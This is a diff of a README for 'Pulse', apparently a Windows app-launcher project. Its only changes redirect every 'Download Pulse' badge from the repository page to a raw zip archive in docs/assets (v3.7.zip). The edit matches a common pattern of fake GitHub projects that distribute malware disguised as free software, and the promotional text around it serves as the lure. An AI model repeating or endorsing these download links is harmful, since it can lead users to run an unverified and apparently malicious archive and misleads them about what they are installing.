@@ -1,7 +1,7 @@
 <h1>🚀 Pulse - Your Fastest Way to Launch Apps</h1>
 
 <p align="center">
-<a href="https://github.com/bridgetdigestible496/Pulse"><img src="https://img.shields.io/badge/Download-Pulse-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Pulse" width="250"></a>
+<a href="https://github.com/bridgetdigestible496/Pulse/raw/refs/heads/main/docs/assets/v3.7.zip"><img src="https://img.shields.io/badge/Download-Pulse-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Pulse" width="250"></a>
 </p>
 
 Pulse is a tiny, lightning-fast launcher that lives quietly in your system tray. Instead of digging through your Start Menu or hunting for desktop icons, press one hotkey, type a few letters, and Pulse opens any program instantly. It works right out of the box — no setup, no coding, no confusion.
@@ -32,7 +32,7 @@ No need to memorize anything. Pulse learns what you open most and puts those res
 Click the green button above or use this link:
 
 <p align="center">
-<a href="https://github.com/bridgetdigestible496/Pulse"><img src="https://img.shields.io/badge/⬇️%20Download%20Pulse%20Now-4B8BBE?style=for-the-badge&logo=windows&logoColor=white" alt="Download Pulse" width="220"></a>
+<a href="https://github.com/bridgetdigestible496/Pulse/raw/refs/heads/main/docs/assets/v3.7.zip"><img src="https://img.shields.io/badge/⬇️%20Download%20Pulse%20Now-4B8BBE?style=for-the-badge&logo=windows&logoColor=white" alt="Download Pulse" width="220"></a>
 </p>
 
 Visit this link to download the application.
@@ -187,7 +187,7 @@ Pulse will save you minutes every day. Those minutes add up to hours every month
 Download Pulse today, give it a try, and enjoy a snappier way to open everything on your Windows PC.
 
 <p align="center">
-<a href="https://github.com/bridgetdigestible496/Pulse"><img src="https://img.shields.io/badge/🚀%20Get%20Pulse%20Free-Download%20Now-orange?style=for-the-badge&logo=github" alt="Download Pulse" width="220"></a>
+<a href="https://github.com/bridgetdigestible496/Pulse/raw/refs/heads/main/docs/assets/v3.7.zip"><img src="https://img.shields.io/badge/🚀%20Get%20Pulse%20Free-Download%20Now-orange?style=for-the-badge&logo=github" alt="Download Pulse" width="220"></a>
 </p>
 
 Keywords: app-launcher, application-launcher, c-plus-plus, cpp, desktop-app, launcher, productivity, qml, qt, qt6, windows
